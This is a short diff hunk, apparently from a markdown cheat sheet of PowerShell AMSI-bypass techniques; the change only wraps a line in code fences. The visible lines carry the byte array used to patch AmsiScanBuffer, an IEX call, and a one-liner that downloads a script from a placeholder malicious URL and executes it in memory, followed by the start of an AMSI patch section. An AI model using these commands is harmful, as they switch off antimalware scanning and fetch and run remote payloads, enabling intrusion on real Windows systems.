@@ -64,9 +64,9 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
     IEX($content)
 
 # The Short version of dont use powershell net webclient
-
+```
 IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/malicious.ps1"))
-
+```
 # Amsi ScanBuffer Patch #
 ```
 Write-Host "-- AMSI Patch"
